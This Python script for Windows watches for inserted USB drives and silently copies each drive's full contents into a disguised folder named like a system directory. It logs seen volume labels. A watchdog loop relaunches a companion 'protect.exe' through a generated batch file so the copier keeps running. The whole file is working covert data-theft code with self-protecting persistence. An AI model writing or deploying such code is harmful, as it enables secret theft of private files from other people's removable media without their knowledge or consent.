# -*- coding : utf-8 -*-
# Writer: Skyler
# Date: Wednesday 2021/4/14
from os import getpid, system
from shutil import copytree
from threading import Thread
from time import strftime, sleep
from psutil import disk_partitions, pids


# every USB
class UsbDevices:
    def __init__(self, name, order, TimE, choice):
        self.name = name
        self.order = order
        self.TimE = TimE
        self.choice = choice

    def threadCp(self):
        copytree(self.order, "D:/Program-files (X86)/PeacefulFiles/USecretPs/" + str(self.TimE))

    def usbCp(self):
        uCpProcess = Thread(target=self.threadCp, daemon=True)
        if self.choice == 1:
            uCpProcess.start()
        elif self.choice == 2:
            pass


# protect thread
def protectStart():
    with open("protect_start.bat", mode="w") as protect:
        protect.write("@ECHO OFF\n")
        protect.write("cd protect\n")
        protect.write("start protect.exe\n")
        protect.write("exit")

    system("start protect_start.bat")


# time
def timeNow():
    date = strftime("%Y") + "-" + strftime("%m") + "-" + strftime("%d")
    clock = strftime("%H") + "_" + strftime("%M") + "_" + strftime("%S")
    Now = date + "---" + clock
    return Now


# check USB disk
def UCheck():
    while True:
        # create USB list
        devices = disk_partitions()
        usbOrderList = []
        usbNameList = []
        optList = []
        # get order
        for devices in devices:
            opt = devices.opts
            optList.append(opt)
            if "removable" in opt:
                usbOrderList.append(devices.device)
        for i in optList:
            if "removable" in i:
                # get usb name
                for usbLs in usbOrderList:
                    usbOrder = list(usbLs)
                    del usbOrder[-1]
                    usbOrder = ''.join(usbOrder)
                    system('vol ' + usbOrder + '>cache.txt')
                    # with open('cache.txt', encoding='unicode_escape') as file:
                    with open('cache.txt', encoding='gbk') as file:
                        fileLine = list(file.readlines()[0])
                        for i in range(12):
                            fileLine.pop(0)
                        fileLine.pop(-1)
                        usbNameList.append(''.join(fileLine))

                # usb numbers
                lenUsb = len(usbOrderList)
                for i in range(lenUsb):
                    # usb copy
                    with open('historyUsb.txt') as his:
                        history = his.readlines()
                    if history == []:
                        secret = UsbDevices(str(usbNameList[i]),
                                            str(usbOrderList[i]), timeNow(),
                                            choice=1)
                        secret.usbCp()
                    elif history != []:
                        sleep(1)
                        # type str like [sun, y, xu, j]
                        history = list(history[-1])
                        del history[-1]
                        del history[0]
                        history = "".join(history)
                        history = list(history)

                        history.append(",")

                        for A in history:
                            if A == "'":
                                history.remove("'")
                            elif A == '"':
                                history.remove('"')
                        print(f"history is {history}")
                        History = []
                        HY = ""
                        for J in history:
                            if J != ",":
                                HY += J
                                print(HY)
                            elif J == ",":
                                History.append(HY)
                                HY = ""
                        print(f"History is {History}")

                        # check if is repeat
                        for ii in History:
                            if ii not in usbNameList:
                                secret = UsbDevices(str(usbNameList[i]),
                                                    str(usbOrderList[i]),
                                                    timeNow(),
                                                    choice=1)
                                secret.usbCp()

                with open('historyUsb.txt', mode='a+') as his:
                    his.write("\n" + str(usbNameList))

        if usbNameList == []:
            with open('historyUsb.txt', mode='w') as his:
                pass

        sleep(5)

if __name__ == '__main__':
    with open('historyUsb.txt', mode='w') as his:
        pass
    uCheckProcess = Thread(target=UCheck, daemon=True)
    uCheckProcess.start()
    # take a note for thread pid
    with open("protect\pid_main.txt", mode="w") as pid_main:
        pid_main.write(str(getpid()))

    while True:
        # get thread pid
        with open("protect\pid_protect.txt") as pid_protect:
            Pid_protect = pid_protect.readlines()[0]

        # check if protect is still running
        if int(Pid_protect) not in pids():
            protectStart()
            with open("protect\pid_protect.txt", mode="w") as A:
                pass

        sleep(3)
